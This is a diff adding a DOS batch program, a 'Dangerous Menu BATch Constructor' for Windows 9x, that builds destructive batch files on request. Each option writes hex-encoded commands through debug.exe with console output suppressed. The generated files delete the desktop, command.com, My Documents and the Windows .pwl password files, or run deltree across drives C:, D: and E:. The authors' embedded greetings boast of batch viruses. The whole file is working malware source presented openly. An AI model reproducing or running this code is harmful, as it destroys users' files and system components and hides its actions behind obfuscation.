@@ -1,0 +1,330 @@
+@echo off
+:menu
+echo.
+echo.
+echo     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+echo     ³ °±²Û Welcome 2 Dangerous Menu BATch Constructor 1.1 Û²±° ³
+echo     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+echo.
+echo            dvl2003ro@yahoo.co.uk or ratty2001ro@yahoo.com
+echo.
+echo      ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
+echo      º  Note: Works only on win9x systems  º
+echo      ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
+echo.
+echo    Make your .bat file:
+echo    ÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄ
+echo.
+echo    1  This file will delete everything from desktop
+echo    2  This file will delete all command.com files
+echo    3  This file will delete everything from My Documents
+echo    4  This file will delete the windows password files
+echo    5  This file will try to delete all your files
+echo.
+echo    6  Inf0 and 0th3r stuFFz
+echo.
+echo    Q  Ex1T from this lame BATch constructor
+echo.
+choice /c:123456Q>nul
+if errorlevel 7 goto done
+if errorlevel 6 goto 6
+if errorlevel 5 goto 5
+if errorlevel 4 goto 4
+if errorlevel 3 goto 3
+if errorlevel 2 goto 2
+if errorlevel 1 goto 1
+echo CHOICE missing
+goto done
+
+:1
+ctty nul
+@echo e 0100  3A 3A 20 43 72 65 61 74 65 64 20 62 79 20 32 20>>K1LLd3sKt0p
+@echo e 0110  67 6F 6F 64 20 66 72 69 65 6E 64 73 20 72 65 75>>K1LLd3sKt0p
+@echo e 0120  6E 69 74 65 64 0D 0A 3A 3A 20 44 76 4C 20 20 20>>K1LLd3sKt0p
+@echo e 0130  20 20 20 28 20 64 76 6C 32 30 30 33 72 6F 40 79>>K1LLd3sKt0p
+@echo e 0140  61 68 6F 6F 2E 63 6F 2E 75 6B 20 29 0D 0A 3A 3A>>K1LLd3sKt0p
+@echo e 0150  20 52 61 74 74 79 20 20 20 20 28 20 72 61 74 74>>K1LLd3sKt0p
+@echo e 0160  79 32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F>>K1LLd3sKt0p
+@echo e 0170  6D 20 29 0D 0A 3A 3A 20 43 6F 6E 74 61 63 74 20>>K1LLd3sKt0p
+@echo e 0180  75 73 2E 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>K1LLd3sKt0p
+@echo e 0190  63 74 74 79 20 6E 75 6C 0D 0A 40 64 65 6C 74 72>>K1LLd3sKt0p
+@echo e 01A0  65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>K1LLd3sKt0p
+@echo e 01B0  77 65 62 5C 20 3E 6E 75 6C 0D 0A 40 64 65 6C 74>>K1LLd3sKt0p
+@echo e 01C0  72 65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73>>K1LLd3sKt0p
+@echo e 01D0  5C 73 74 61 72 74 6D 7E 31 5C 20 3E 6E 75 6C 0D>>K1LLd3sKt0p
+@echo e 01E0  0A 40 64 65 6C 74 72 65 65 2F 79 20 63 3A 5C 77>>K1LLd3sKt0p
+@echo e 01F0  69 6E 64 6F 77 73 5C 64 65 73 6B 74 6F 70 5C 20>>K1LLd3sKt0p
+@echo e 0200  3E 6E 75 6C 0D 0A 40 64 65 6C 74 72 65 65 2F 79>>K1LLd3sKt0p
+@echo e 0210  20 63 3A 5C 77 69 6E 64 6F 77 73 5C 61 70 70 6C>>K1LLd3sKt0p
+@echo e 0220  69 63 7E 31 5C 20 3E 6E 75 6C 0D 0A 63 74 74 79>>K1LLd3sKt0p
+@echo e 0230  20 63 6F 6E 0D 0A 63 6C 73 0D 0A 3A 3A 20 43 72>>K1LLd3sKt0p
+@echo e 0240  65 61 74 65 64 20 66 6F 72 20 44 4D 20 31 2E 31>>K1LLd3sKt0p
+@echo e 0250  20 62 79 20 52 61 74 74 79 20 61 6E 64 20 44 76>>K1LLd3sKt0p
+@echo e 0260  4C 0D 0A 3A 3A 20 30 34 2E 30 35 2E 32 30 30 33>>K1LLd3sKt0p
+@echo e 0270  00>>K1LLd3sKt0p
+@echo rcx>>K1LLd3sKt0p
+@echo 170>>K1LLd3sKt0p
+@echo n bat>>K1LLd3sKt0p
+@echo w>>K1LLd3sKt0p
+@echo q>>K1LLd3sKt0p
+@debug<K1LLd3sKt0p
+@ren bat K1LLd3sKt0p.bat
+@deltree/y bat >nul
+@deltree/y K1LLd3sKt0p >nul
+ctty con
+goto menu
+
+:2
+ctty nul
+@echo e 0100  3A 3A 20 43 72 65 61 74 65 64 20 62 79 20 32 20>>K1LLc0mm4nD
+@echo e 0110  67 6F 6F 64 20 66 72 69 65 6E 64 73 20 72 65 75>>K1LLc0mm4nD
+@echo e 0120  6E 69 74 65 64 0D 0A 3A 3A 20 44 76 4C 20 20 20>>K1LLc0mm4nD
+@echo e 0130  20 20 20 28 20 64 76 6C 32 30 30 33 72 6F 40 79>>K1LLc0mm4nD
+@echo e 0140  61 68 6F 6F 2E 63 6F 2E 75 6B 20 29 0D 0A 3A 3A>>K1LLc0mm4nD
+@echo e 0150  20 52 61 74 74 79 20 20 20 20 28 20 72 61 74 74>>K1LLc0mm4nD
+@echo e 0160  79 32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F>>K1LLc0mm4nD
+@echo e 0170  6D 20 29 0D 0A 3A 3A 20 43 6F 6E 74 61 63 74 20>>K1LLc0mm4nD
+@echo e 0180  75 73 2E 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>K1LLc0mm4nD
+@echo e 0190  63 74 74 79 20 6E 75 6C 0D 0A 40 64 65 6C 74 72>>K1LLc0mm4nD
+@echo e 01A0  65 65 2F 79 20 63 3A 5C 63 6F 6D 6D 61 6E 64 2E>>K1LLc0mm4nD
+@echo e 01B0  63 6F 6D 20 3E 6E 75 6C 0D 0A 40 64 65 6C 74 72>>K1LLc0mm4nD
+@echo e 01C0  65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>K1LLc0mm4nD
+@echo e 01D0  63 6F 6D 6D 61 6E 64 5C 63 6F 6D 6D 61 6E 64 2E>>K1LLc0mm4nD
+@echo e 01E0  63 6F 6D 20 3E 6E 75 6C 0D 0A 40 64 65 6C 74 72>>K1LLc0mm4nD
+@echo e 01F0  65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>K1LLc0mm4nD
+@echo e 0200  63 6F 6D 6D 61 6E 64 2E 63 6F 6D 20 3E 6E 75 6C>>K1LLc0mm4nD
+@echo e 0210  0D 0A 63 74 74 79 20 63 6F 6E 0D 0A 63 6C 73 0D>>K1LLc0mm4nD
+@echo e 0220  0A 3A 3A 20 43 72 65 61 74 65 64 20 66 6F 72 20>>K1LLc0mm4nD
+@echo e 0230  44 4D 20 31 2E 31 20 62 79 20 52 61 74 74 79 20>>K1LLc0mm4nD
+@echo e 0240  61 6E 64 20 44 76 4C 0D 0A 3A 3A 20 30 34 2E 30>>K1LLc0mm4nD
+@echo e 0250  35 2E 32 30 30 33 00>>K1LLc0mm4nD
+@echo rcx>>K1LLc0mm4nD
+@echo 156>>K1LLc0mm4nD
+@echo n bat>>K1LLc0mm4nD
+@echo w>>K1LLc0mm4nD
+@echo q>>K1LLc0mm4nD
+@debug<K1LLc0mm4nD
+@ren bat K1LLc0mm4nD.bat
+@deltree/y bat >nul
+@deltree/y K1LLc0mm4nD >nul
+ctty con
+goto menu
+
+:3
+ctty nul
+@echo e 0100  3A 3A 20 43 72 65 61 74 65 64 20 62 79 20 32 20>>K1LLmYd0cZ
+@echo e 0110  67 6F 6F 64 20 66 72 69 65 6E 64 73 20 72 65 75>>K1LLmYd0cZ
+@echo e 0120  6E 69 74 65 64 0D 0A 3A 3A 20 44 76 4C 20 20 20>>K1LLmYd0cZ
+@echo e 0130  20 20 20 28 20 64 76 6C 32 30 30 33 72 6F 40 79>>K1LLmYd0cZ
+@echo e 0140  61 68 6F 6F 2E 63 6F 2E 75 6B 20 29 0D 0A 3A 3A>>K1LLmYd0cZ
+@echo e 0150  20 52 61 74 74 79 20 20 20 20 28 20 72 61 74 74>>K1LLmYd0cZ
+@echo e 0160  79 32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F>>K1LLmYd0cZ
+@echo e 0170  6D 20 29 0D 0A 3A 3A 20 43 6F 6E 74 61 63 74 20>>K1LLmYd0cZ
+@echo e 0180  75 73 2E 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>K1LLmYd0cZ
+@echo e 0190  63 74 74 79 20 6E 75 6C 0D 0A 40 72 65 6E 20 63>>K1LLmYd0cZ
+@echo e 01A0  3A 5C 6D 79 64 6F 63 75 7E 31 20 54 72 34 73 48>>K1LLmYd0cZ
+@echo e 01B0  0D 0A 40 64 65 6C 74 72 65 65 2F 79 20 63 3A 5C>>K1LLmYd0cZ
+@echo e 01C0  54 72 34 73 48 5C 20 3E 6E 75 6C 0D 0A 63 74 74>>K1LLmYd0cZ
+@echo e 01D0  79 20 63 6F 6E 0D 0A 63 6C 73 0D 0A 3A 3A 20 43>>K1LLmYd0cZ
+@echo e 01E0  72 65 61 74 65 64 20 66 6F 72 20 44 4D 20 31 2E>>K1LLmYd0cZ
+@echo e 01F0  31 20 62 79 20 52 61 74 74 79 20 61 6E 64 20 44>>K1LLmYd0cZ
+@echo e 0200  76 4C 0D 0A 3A 3A 20 30 34 2E 30 35 2E 32 30 30>>K1LLmYd0cZ
+@echo e 0210  33 00>>K1LLmYd0cZ
+@echo rcx>>K1LLmYd0cZ
+@echo 111>>K1LLmYd0cZ
+@echo n bat>>K1LLmYd0cZ
+@echo w>>K1LLmYd0cZ
+@echo q>>K1LLmYd0cZ
+@debug<K1LLmYd0cZ
+@ren bat K1LLmYd0cZ.bat
+@deltree/y bat >nul
+@deltree/y K1LLmYd0cZ >nul
+ctty con
+goto menu
+
+:4
+ctty nul
+@echo e 0100  3A 3A 20 43 72 65 61 74 65 64 20 62 79 20 32 20>>K1LLw1nPWL
+@echo e 0110  67 6F 6F 64 20 66 72 69 65 6E 64 73 20 72 65 75>>K1LLw1nPWL
+@echo e 0120  6E 69 74 65 64 0D 0A 3A 3A 20 44 76 4C 20 20 20>>K1LLw1nPWL
+@echo e 0130  20 20 20 28 20 64 76 6C 32 30 30 33 72 6F 40 79>>K1LLw1nPWL
+@echo e 0140  61 68 6F 6F 2E 63 6F 2E 75 6B 20 29 0D 0A 3A 3A>>K1LLw1nPWL
+@echo e 0150  20 52 61 74 74 79 20 20 20 20 28 20 72 61 74 74>>K1LLw1nPWL
+@echo e 0160  79 32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F>>K1LLw1nPWL
+@echo e 0170  6D 20 29 0D 0A 3A 3A 20 43 6F 6E 74 61 63 74 20>>K1LLw1nPWL
+@echo e 0180  75 73 2E 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>K1LLw1nPWL
+@echo e 0190  63 74 74 79 20 6E 75 6C 0D 0A 40 64 65 6C 74 72>>K1LLw1nPWL
+@echo e 01A0  65 65 2F 79 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>K1LLw1nPWL
+@echo e 01B0  2A 2E 70 77 6C 20 3E 6E 75 6C 0D 0A 63 74 74 79>>K1LLw1nPWL
+@echo e 01C0  20 63 6F 6E 0D 0A 63 6C 73 0D 0A 3A 3A 20 43 72>>K1LLw1nPWL
+@echo e 01D0  65 61 74 65 64 20 66 6F 72 20 44 4D 20 31 2E 31>>K1LLw1nPWL
+@echo e 01E0  20 62 79 20 52 61 74 74 79 20 61 6E 64 20 44 76>>K1LLw1nPWL
+@echo e 01F0  4C 0D 0A 3A 3A 20 30 34 2E 30 35 2E 32 30 30 33>>K1LLw1nPWL
+@echo e 0200  00>>K1LLw1nPWL
+@echo rcx>>K1LLw1nPWL
+@echo 100>>K1LLw1nPWL
+@echo n bat>>K1LLw1nPWL
+@echo w>>K1LLw1nPWL
+@echo q>>K1LLw1nPWL
+@debug<K1LLw1nPWL
+@ren bat K1LLw1nPWL.bat
+@deltree/y bat >nul
+@deltree/y K1LLw1nPWL >nul
+ctty con
+goto menu
+
+:5
+ctty nul
+@echo e 0100  3A 3A 20 43 72 65 61 74 65 64 20 62 79 20 32 20>>K1LLdR1v3z
+@echo e 0110  67 6F 6F 64 20 66 72 69 65 6E 64 73 20 72 65 75>>K1LLdR1v3z
+@echo e 0120  6E 69 74 65 64 0D 0A 3A 3A 20 44 76 4C 20 20 20>>K1LLdR1v3z
+@echo e 0130  20 20 20 28 20 64 76 6C 32 30 30 33 72 6F 40 79>>K1LLdR1v3z
+@echo e 0140  61 68 6F 6F 2E 63 6F 2E 75 6B 20 29 0D 0A 3A 3A>>K1LLdR1v3z
+@echo e 0150  20 52 61 74 74 79 20 20 20 20 28 20 72 61 74 74>>K1LLdR1v3z
+@echo e 0160  79 32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F>>K1LLdR1v3z
+@echo e 0170  6D 20 29 0D 0A 3A 3A 20 43 6F 6E 74 61 63 74 20>>K1LLdR1v3z
+@echo e 0180  75 73 2E 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A>>K1LLdR1v3z
+@echo e 0190  63 74 74 79 20 6E 75 6C 0D 0A 40 66 6F 72 20 25>>K1LLdR1v3z
+@echo e 01A0  64 20 69 6E 20 28 64 3A 5C 29 20 64 6F 20 64 65>>K1LLdR1v3z
+@echo e 01B0  6C 74 72 65 65 2F 79 20 25 64 20 3E 6E 75 6C 0D>>K1LLdR1v3z
+@echo e 01C0  0A 40 66 6F 72 20 25 65 20 69 6E 20 28 65 3A 5C>>K1LLdR1v3z
+@echo e 01D0  29 20 64 6F 20 64 65 6C 74 72 65 65 2F 79 20 25>>K1LLdR1v3z
+@echo e 01E0  65 20 3E 6E 75 6C 0D 0A 40 66 6F 72 20 25 63 20>>K1LLdR1v3z
+@echo e 01F0  69 6E 20 28 63 3A 5C 29 20 64 6F 20 64 65 6C 74>>K1LLdR1v3z
+@echo e 0200  72 65 65 2F 79 20 25 63 20 3E 6E 75 6C 0D 0A 63>>K1LLdR1v3z
+@echo e 0210  74 74 79 20 63 6F 6E 0D 0A 63 6C 73 0D 0A 3A 3A>>K1LLdR1v3z
+@echo e 0220  20 43 72 65 61 74 65 64 20 66 6F 72 20 44 4D 20>>K1LLdR1v3z
+@echo e 0230  31 2E 31 20 62 79 20 52 61 74 74 79 20 61 6E 64>>K1LLdR1v3z
+@echo e 0240  20 44 76 4C 0D 0A 3A 3A 20 30 34 2E 30 35 2E 32>>K1LLdR1v3z
+@echo e 0250  30 30 33 00>>K1LLdR1v3z
+@echo rcx>>K1LLdR1v3z
+@echo 153>>K1LLdR1v3z
+@echo n bat>>K1LLdR1v3z
+@echo w>>K1LLdR1v3z
+@echo q>>K1LLdR1v3z
+@debug<K1LLdR1v3z
+@ren bat K1LLdR1v3z.bat
+@deltree/y bat >nul
+@deltree/y K1LLdR1v3z >nul
+ctty con
+goto menu
+
+:6
+ctty nul
+@echo e 0100  44 61 6E 67 65 72 6F 75 73 20 4D 65 6E 75 20 31>>gr33tZ
+@echo e 0110  2E 31 20 43 6F 6E 73 74 72 75 63 74 6F 72 20 62>>gr33tZ
+@echo e 0120  79 20 44 56 4C 20 61 6E 64 20 52 61 74 74 79 0D>>gr33tZ
+@echo e 0130  0A 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0140  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0150  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0160  0D 0A 0D 0A 54 68 69 73 20 75 74 69 6C 69 74 79>>gr33tZ
+@echo e 0170  20 63 61 6E 20 65 61 73 69 6C 79 20 63 72 65 61>>gr33tZ
+@echo e 0180  74 65 20 2E 62 61 74 20 66 69 6C 65 73 20 77 69>>gr33tZ
+@echo e 0190  74 68 0D 0A 64 61 6E 67 65 72 6F 75 73 20 28 62>>gr33tZ
+@echo e 01A0  75 74 20 6C 61 6D 65 29 20 63 6F 6D 6D 61 6E 64>>gr33tZ
+@echo e 01B0  73 2E 0D 0A 0D 0A 4E 65 77 73 20 3A 20 0D 0A 3D>>gr33tZ
+@echo e 01C0  3D 3D 3D 3D 3D 0D 0A 2D 20 41 66 74 65 72 20 61>>gr33tZ
+@echo e 01D0  20 6C 6F 6E 67 20 77 65 65 6B 20 6F 66 20 74 61>>gr33tZ
+@echo e 01E0  6C 6B 69 6E 67 20 69 27 76 65 20 72 65 75 6E 69>>gr33tZ
+@echo e 01F0  74 65 64 20 77 69 74 68 0D 0A 20 20 74 68 65 20>>gr33tZ
+@echo e 0200  63 6F 6F 6C 65 73 74 20 67 75 79 20 69 20 6B 6E>>gr33tZ
+@echo e 0210  6F 77 20 2E 2E 2E 20 52 61 74 74 79 2E 0D 0A 0D>>gr33tZ
+@echo e 0220  0A 57 68 61 74 27 73 20 74 68 69 73 20 76 65 72>>gr33tZ
+@echo e 0230  73 69 6F 6E 20 63 6F 6E 74 61 69 6E 73 20 3F 0D>>gr33tZ
+@echo e 0240  0A 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0250  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0D 0A 0D>>gr33tZ
+@echo e 0260  0A 2D 20 6D 61 6E 79 20 66 69 78 65 64 20 62 75>>gr33tZ
+@echo e 0270  67 73 20 74 68 61 74 20 69 27 76 65 20 64 6F 6E>>gr33tZ
+@echo e 0280  65 20 69 6E 20 74 68 65 20 31 73 74 20 76 65 72>>gr33tZ
+@echo e 0290  73 69 6F 6E 2C 0D 0A 20 20 52 61 74 74 79 20 68>>gr33tZ
+@echo e 02A0  65 6C 70 65 64 20 6D 65 20 74 6F 20 66 69 78 20>>gr33tZ
+@echo e 02B0  61 6C 6C 20 74 68 6F 73 65 2C 20 6D 61 6E 79 20>>gr33tZ
+@echo e 02C0  31 30 78 20 64 75 64 65 2E 0D 0A 2D 20 61 20 6E>>gr33tZ
+@echo e 02D0  65 77 20 6F 70 74 69 6F 6E 20 66 6F 72 20 64 65>>gr33tZ
+@echo e 02E0  6C 65 74 69 6E 67 20 65 76 65 72 79 74 68 69 6E>>gr33tZ
+@echo e 02F0  67 20 6F 6E 20 73 65 76 65 72 61 6C 20 64 72 69>>gr33tZ
+@echo e 0300  76 65 73 2E 0D 0A 0D 0A 50 72 6F 6A 65 63 74 73>>gr33tZ
+@echo e 0310  20 62 79 20 6D 65 20 28 61 6E 64 20 52 61 74 74>>gr33tZ
+@echo e 0320  79 29 3A 0D 0A 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0330  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0340  0D 0A 2D 20 50 72 6F 6A 65 63 74 20 44 4D 20 61>>gr33tZ
+@echo e 0350  6C 69 61 73 20 44 61 6E 67 65 72 6F 75 73 20 4D>>gr33tZ
+@echo e 0360  65 6E 75 20 28 76 20 31 2E 78 20 61 6E 64 20 76>>gr33tZ
+@echo e 0370  20 32 2E 30 29 0D 0A 20 20 69 6E 20 63 6F 6C 61>>gr33tZ
+@echo e 0380  62 6F 72 61 74 69 6F 6E 20 77 69 74 68 20 52 61>>gr33tZ
+@echo e 0390  74 74 79 28 72 61 74 74 79 32 30 30 31 72 6F 40>>gr33tZ
+@echo e 03A0  79 61 68 6F 6F 2E 63 6F 6D 29 0D 0A 2D 20 50 72>>gr33tZ
+@echo e 03B0  6F 6A 65 63 74 20 45 6D 69 6C 69 61 20 28 76 20>>gr33tZ
+@echo e 03C0  61 2D 62 2D 63 2D 64 20 2B 20 72 65 76 69 73 69>>gr33tZ
+@echo e 03D0  6F 6E 20 76 65 72 73 69 6F 6E 73 29 0D 0A 2D 20>>gr33tZ
+@echo e 03E0  50 72 6F 6A 65 63 74 20 53 42 43 20 28 54 68 65>>gr33tZ
+@echo e 03F0  20 53 69 6C 6C 79 20 42 41 54 63 68 20 66 69 6C>>gr33tZ
+@echo e 0400  65 28 73 29 20 63 6F 6E 73 74 72 75 63 74 6F 72>>gr33tZ
+@echo e 0410  29 0D 0A 2D 20 33 35 20 42 41 54 63 68 20 76 69>>gr33tZ
+@echo e 0420  72 69 69 20 63 72 65 61 74 65 64 20 69 6E 20 63>>gr33tZ
+@echo e 0430  6F 6C 61 62 6F 72 61 74 69 6F 6E 20 77 69 74 68>>gr33tZ
+@echo e 0440  20 52 61 74 74 79 0D 0A 20 20 28 72 61 74 74 79>>gr33tZ
+@echo e 0450  32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F 6D>>gr33tZ
+@echo e 0460  29 2E 0D 0A 0D 0A 54 75 74 6F 72 69 61 6C 7A 20>>gr33tZ
+@echo e 0470  6D 61 64 65 20 62 79 20 6D 65 3A 0D 0A 3D 3D 3D>>gr33tZ
+@echo e 0480  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0490  3D 3D 0D 0A 2D 20 4C 65 61 72 6E 69 6E 67 20 42>>gr33tZ
+@echo e 04A0  41 54 63 68 20 61 6E 64 20 73 6F 6D 65 20 42 41>>gr33tZ
+@echo e 04B0  54 63 68 20 74 65 68 6E 69 71 75 65 73 20 77 69>>gr33tZ
+@echo e 04C0  74 68 20 44 56 4C 0D 0A 0D 0A 4E 6F 74 65 3A 20>>gr33tZ
+@echo e 04D0  49 66 20 75 20 77 61 6E 74 20 73 6F 6D 65 74 68>>gr33tZ
+@echo e 04E0  69 6E 67 20 66 72 6F 6D 20 61 6C 6C 20 74 68 6F>>gr33tZ
+@echo e 04F0  73 65 2C 20 6D 61 69 6C 20 6D 65 2E 0D 0A 3D 3D>>gr33tZ
+@echo e 0500  3D 3D 0D 0A 0D 0A 57 68 65 72 65 20 74 6F 20 63>>gr33tZ
+@echo e 0510  6F 6E 74 61 63 74 20 75 73 20 3F 0D 0A 3D 3D 3D>>gr33tZ
+@echo e 0520  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
+@echo e 0530  3D 3D 0D 0A 2D 20 6D 65 20 28 44 56 4C 29 20 2D>>gr33tZ
+@echo e 0540  2D 3E 20 64 76 6C 32 30 30 33 72 6F 40 79 61 68>>gr33tZ
+@echo e 0550  6F 6F 2E 63 6F 2E 75 6B 0D 0A 2D 20 52 61 74 74>>gr33tZ
+@echo e 0560  79 20 20 20 20 2D 2D 3E 20 72 61 74 74 79 32 30>>gr33tZ
+@echo e 0570  30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F 6D 0D 0A>>gr33tZ
+@echo e 0580  0D 0A 20 20 20 47 72 65 65 74 7A 20 61 6E 64 20>>gr33tZ
+@echo e 0590  73 70 65 63 69 61 6C 20 31 30 78 20 67 6F 65 73>>gr33tZ
+@echo e 05A0  20 74 6F 3A 0D 0A 20 20 20 2D 2D 2D 2D 2D 2D 2D>>gr33tZ
+@echo e 05B0  2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D>>gr33tZ
+@echo e 05C0  2D 2D 2D 2D 2D 2D 2D 2D 0D 0A 20 20 20 20 20 20>>gr33tZ
+@echo e 05D0  2D 20 4E 47 4C 20 2D 20 6D 79 74 68 5F 65 75 40>>gr33tZ
+@echo e 05E0  79 61 68 6F 6F 2E 63 6F 6D 0D 0A 20 20 20 20 20>>gr33tZ
+@echo e 05F0  20 2D 20 52 61 74 74 79 20 2D 20 72 61 74 74 79>>gr33tZ
+@echo e 0600  32 30 30 31 72 6F 40 79 61 68 6F 6F 2E 63 6F 6D>>gr33tZ
+@echo e 0610  20 61 6E 64 20 68 74 74 70 3A 2F 2F 72 61 74 74>>gr33tZ
+@echo e 0620  79 2E 68 6F 6D 65 2E 72 6F 2F 0D 0A 20 20 20 20>>gr33tZ
+@echo e 0630  20 20 2D 20 4B 61 73 70 65 72 73 6B 79 20 2D 20>>gr33tZ
+@echo e 0640  77 77 77 2E 6B 61 73 70 65 72 73 6B 79 2E 63 6F>>gr33tZ
+@echo e 0650  6D 0D 0A 20 20 20 20 20 20 2D 20 53 70 54 68 20>>gr33tZ
+@echo e 0660  2D 20 53 50 54 48 40 61 6F 6E 6D 61 69 6C 2E 61>>gr33tZ
+@echo e 0670  74 20 61 6E 64 20 77 77 77 2E 73 70 74 68 2E 64>>gr33tZ
+@echo e 0680  65 2E 76 75 0D 0A 20 20 20 20 20 20 2D 20 53 61>>gr33tZ
+@echo e 0690  64 31 63 20 2D 20 73 61 64 31 63 40 69 6E 74 65>>gr33tZ
+@echo e 06A0  72 66 72 65 65 2E 69 74 20 61 6E 64 20 68 74 74>>gr33tZ
+@echo e 06B0  70 3A 2F 2F 73 61 64 31 63 70 61 67 65 2E 73 75>>gr33tZ
+@echo e 06C0  70 65 72 65 76 61 2E 69 74 2F 0D 0A 20 20 20 20>>gr33tZ
+@echo e 06D0  20 20 2D 20 41 64 64 65 72 20 2D 20 61 64 64 65>>gr33tZ
+@echo e 06E0  72 5F 32 30 30 33 40 79 61 68 6F 6F 2E 63 6F 6D>>gr33tZ
+@echo e 06F0  0D 0A 20 20 20 20 20 20 2D 20 4E 69 6E 6F 20 2D>>gr33tZ
+@echo e 0700  20 64 72 6C 69 6B 73 40 79 61 68 6F 6F 2E 63 6F>>gr33tZ
+@echo e 0710  6D 0D 0A 20 20 20 20 20 20 2D 20 41 6C 63 6F 50>>gr33tZ
+@echo e 0720  61 75 6C 20 2D 20 68 74 74 70 3A 2F 2F 61 6C 63>>gr33tZ
+@echo e 0730  6F 70 61 75 6C 2E 63 6A 62 2E 6E 65 74 2F 0D 0A>>gr33tZ
+@echo e 0740  0D 0A 53 69 20 79 34 20 2E 2E 2E 20 21 21 3F 20>>gr33tZ
+@echo e 0750  00>>gr33tZ
+@echo rcx>>gr33tZ
+@echo 650>>gr33tZ
+@echo n txt>>gr33tZ
+@echo w>>gr33tZ
+@echo q>>gr33tZ
+@debug<gr33tZ
+@ren txt gr33tZ.txt
+@deltree/y txt >nul
+@deltree/y gr33tZ >nul
+@start /max c:\windows\notepad.exe gr33tZ.txt >nul
+ctty con
+goto menu
+
+:done
+cls
